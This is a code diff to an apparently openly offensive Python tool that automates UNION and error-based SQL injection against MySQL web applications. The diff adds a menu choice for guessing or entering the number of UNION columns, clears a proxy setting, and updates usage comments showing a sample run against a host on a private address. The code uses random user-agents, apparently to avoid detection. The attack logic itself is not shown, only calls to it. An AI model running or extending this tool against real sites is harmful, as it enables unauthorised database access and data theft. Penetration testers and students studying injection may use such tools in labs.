@@ -2,6 +2,10 @@
 # $ python3 sqli_mysql_union_error_based.py id get "1" ";-- " http://192.168.252.6/cat.php
 # [?] Select a parameter to test for injection:: id
 #  > id
+#
+# [?] Choose a method for getting number of columns via UNION.: Guess via ORDER/GROUP
+#  > Guess via ORDER/GROUP
+#    Enter manually
 # 
 # [*] Guessing number of columns for param ID via ORDER BY 
 # [*] Number of columns for parameter ID found: 4
@@ -31,7 +35,6 @@
 # 
 # [+] Done!
 
-
 #!/usr/bin/python3
 import requests
 import urllib3
@@ -44,7 +47,7 @@ from random_useragent.random_useragent import Randomize     # Randomize useragen
 
 # Optionally, use a proxy
 # proxy = "http://<user>:<pass>@<proxy>:<port>"
-proxy = "http://localhost:8080"
+proxy = ""
 os.environ['http_proxy'] = proxy
 os.environ['HTTP_PROXY'] = proxy
 os.environ['https_proxy'] = proxy
@@ -232,13 +235,25 @@ def main(argv):
         param_answer = inquirer.prompt(param_question)
         inj_param = param_answer["params"]
 
-        # Getting number of columns
-        num_cols = get_cols(url,headers,get_post,inj_param,params,prefix,suffix)
-        if num_cols:
-            print("[*] Number of columns for parameter " + inj_param.upper() + " found: " + str(num_cols))
-        else:
-            print("[!] No columns found, check your requests")
-            exit(-1)
+        # Ask for method of getting number of columns
+        options = ["Guess via ORDER/GROUP","Enter manually"]
+        meth_guess_cols_question = [inquirer.List('options',
+                            message="Choose a method for getting number of columns via UNION.",
+                            choices = options),]
+        meth_guess_cols_answer = inquirer.prompt(meth_guess_cols_question)
+        cols_method = meth_guess_cols_answer["options"]
+        
+        if cols_method == "Guess via ORDER/GROUP":
+            # Getting number of columns by guessing
+            num_cols = get_cols(url,headers,get_post,inj_param,params,prefix,suffix)
+            if num_cols:
+                print("[*] Number of columns for parameter " + inj_param.upper() + " found: " + str(num_cols))
+            else:
+                print("[!] No columns found, check your requests")
+                exit(-1)
+        elif cols_method == "Enter manually":
+            # Enter number of columns manually
+            num_cols = int(input("Enter number of columns: "))
 
         # Test if a certain column is usable
         usable_column = blind_test(url,headers,get_post,inj_param,params,num_cols,prefix,suffix)
